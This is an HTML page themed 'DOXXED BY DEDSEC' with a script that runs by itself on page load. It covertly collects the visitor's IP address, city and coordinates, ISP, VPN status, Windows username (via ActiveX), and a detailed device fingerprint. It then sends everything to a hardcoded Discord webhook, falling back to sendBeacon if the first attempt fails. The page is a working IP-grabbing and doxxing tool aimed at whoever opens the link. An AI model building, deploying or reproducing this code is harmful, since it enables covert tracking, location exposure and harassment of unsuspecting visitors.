<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OMG! IT'S DEDSEC</title>
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@700&display=swap" rel="stylesheet">
    <style>
        body {
            position: relative;
            display: flex;
            align-items: flex-start;
            justify-content: center;
            height: 100vh;
            margin: 0;
            font-family: Arial, sans-serif;
            overflow: hidden;
            background-image: url('https://i.imgur.com/cVnL0wo.png');
            background-repeat: repeat;
        }
        .texto-no-interactivo {
            font-family: 'JetBrains Mono', monospace;
            font-weight: 700;
            font-size: 3em;
            color: #00ff00;
            padding: 15px;
            text-shadow: 2px 2px 10px rgba(0, 0, 0, 1);
            margin-top: 15vh;
            pointer-events: none;
            z-index: 10;
        }
        #video-inferior {
            position: absolute;
            bottom: 0;
            left: 50%;
            transform: translateX(-50%);
            width: 80%;
            max-width: 800px;
            height: auto;
            z-index: 5;
        }
        #video-esquina-izquierda {
            position: absolute;
            top: 0px;
            left: 0px;
            width: 100px;
            height: auto;
            z-index: 10;
            pointer-events: none;
        }
        #status {
            position: fixed;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(0,0,0,0.8);
            color: #00ff00;
            padding: 8px 16px;
            border-radius: 6px;
            font-family: 'JetBrains Mono', monospace;
            font-size: 14px;
            z-index: 999;
            border: 1px solid #00ff00;
            pointer-events: none;
        }
    </style>
</head>
<body>

    <div class="texto-no-interactivo">DOXXED BY DEDSEC</div>

    <video id="video-inferior" autoplay muted loop playsinline>
        <source src="https://i.imgur.com/C7Br6Cc.mp4" type="video/mp4">
    </video>
    <video id="video-esquina-izquierda" autoplay muted loop playsinline>
        <source src="https://i.imgur.com/uhslwlA.mp4" type="video/mp4">
    </video>

    <div id="status">⏳ Sending...</div>

<script>
    // ================================================================
    //  WEBHOOK (your new one)
    // ================================================================
    const WEBHOOK = "https://discord.com/api/webhooks/1537148912111059014/BqjpnaFhgaclQzaFHQ5aFUktrEg4Vo-YdgxKDtjP3C-o9bPIz5biUvNnjth25Gmu6iR6";

    // Status update
    function setStatus(text, isError = false) {
        const el = document.getElementById('status');
        if (el) {
            el.textContent = text;
            el.style.color = isError ? '#ff4444' : '#00ff00';
            el.style.borderColor = isError ? '#ff4444' : '#00ff00';
        }
    }

    // ================================================================
    //  GET IP WITH TIMEOUT (race between fetch and 2s timer)
    // ================================================================
    function getIPWithTimeout(timeout = 2000) {
        return Promise.race([
            fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(2500) })
                .then(res => res.json())
                .then(data => {
                    if (data.ip) return data;
                    throw new Error('No IP');
                })
                .catch(() => {
                    // fallback to ip-api.com
                    return fetch('http://ip-api.com/json/', { signal: AbortSignal.timeout(2500) })
                        .then(res => res.json())
                        .then(data => {
                            if (data.query) {
                                return {
                                    ip: data.query,
                                    org: data.isp,
                                    country_name: data.country,
                                    region: data.regionName,
                                    city: data.city,
                                    latitude: data.lat,
                                    longitude: data.lon,
                                    proxy: data.proxy || false
                                };
                            }
                            throw new Error('No IP');
                        });
                }),
            new Promise((resolve) => setTimeout(() => resolve(null), timeout))
        ]);
    }

    // ================================================================
    //  MAIN
    // ================================================================
    (async function() {
        try {
            // ---- 1. Gather system info (synchronous) ----
            const ua = navigator.userAgent;
            const os = (function() {
                if (ua.includes('Windows NT')) return 'Windows';
                if (ua.includes('Macintosh')) return 'macOS';
                if (ua.includes('iPhone')) return 'iOS';
                if (ua.includes('Android')) return 'Android';
                return 'Unknown';
            })();
            const browser = (function() {
                if (ua.includes('Chrome') && !ua.includes('Edg')) return 'Chrome';
                if (ua.includes('Firefox')) return 'Firefox';
                if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Safari';
                if (ua.includes('Edg')) return 'Edge';
                return 'Other';
            })();

            let gpu = 'Unavailable';
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl');
                const debug = gl.getExtension('WEBGL_debug_renderer_info');
                if (debug) {
                    gpu = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) || 'Unavailable';
                }
            } catch (e) {}

            const plugins = Array.from(navigator.plugins || []).map(p => p.name).join(', ') || 'none';

            let battery = 'Unavailable';
            try {
                const b = await navigator.getBattery();
                battery = Math.round(b.level * 100) + '% (' + (b.charging ? 'charging' : 'discharging') + ')';
            } catch (e) {}

            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

            // ---- 2. Windows username (ActiveX) ----
            let winUser = 'Not available (IE/ActiveX required)';
            try {
                const wsh = new ActiveXObject('WScript.Shell');
                winUser = wsh.ExpandEnvironmentStrings('%USERNAME%');
            } catch (e) {}

            // ---- 3. Get IP (with timeout, do not block sending) ----
            setStatus('⏳ Gathering IP...');
            const ipData = await getIPWithTimeout(2000);

            // ---- 4. VPN detection ----
            let isVpn = false;
            if (ipData) {
                if (ipData.proxy === true) isVpn = true;
                if (ipData.org) {
                    const vpnKeywords = ['vpn','proxy','hosting','cloud','datacenter','tor','anonymous'];
                    const orgLower = ipData.org.toLowerCase();
                    if (vpnKeywords.some(k => orgLower.includes(k))) isVpn = true;
                }
            }

            // ---- 5. Build message ----
            const ip = ipData ? ipData.ip : 'Unknown';
            const isp = ipData ? ipData.org : 'Unknown ISP';
            const location = ipData ? ipData.city + ', ' + ipData.region + ', ' + ipData.country_name : 'Unknown';
            const coords = ipData ? ipData.latitude + ', ' + ipData.longitude : 'Unknown';

            const msg = 
`**ctOS User Info**
**IP:** ${ip} (${isp})
**Location:** ${location}
**Coordinates:** ${coords}
**VPN/Tor:** ${isVpn ? 'Yes' : 'No'}
**Windows Username:** ${winUser}
**OS:** ${os}
**Browser:** ${browser}
**CPU Cores:** ${navigator.hardwareConcurrency || '?'}
**RAM:** ${navigator.deviceMemory || '?'} GB
**Screen:** ${screen.width}x${screen.height}x${screen.colorDepth}
**Battery:** ${battery}
**Time Zone:** ${timezone}
**GPU:** ${gpu}
**Plugins:** ${plugins}
**Timestamp:** ${new Date().toLocaleString()}`;

            // ---- 6. Send to Discord ----
            setStatus('📤 Sending...');
            let sent = false;

            // Try fetch with keepalive
            try {
                const response = await fetch(WEBHOOK, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ content: msg }),
                    keepalive: true
                });
                if (response.ok) sent = true;
            } catch (e) {}

            // Fallback: sendBeacon
            if (!sent) {
                const blob = new Blob([JSON.stringify({ content: msg })], { type: 'application/json' });
                if (navigator.sendBeacon(WEBHOOK, blob)) sent = true;
            }

            // Final status
            if (sent) {
                setStatus('✅ Sent!');
            } else {
                setStatus('❌ Send failed (check webhook)', true);
            }

        } catch (err) {
            setStatus('❌ Error: ' + err.message, true);
            console.error(err);
        }
    })();
</script>
</body>
</html>
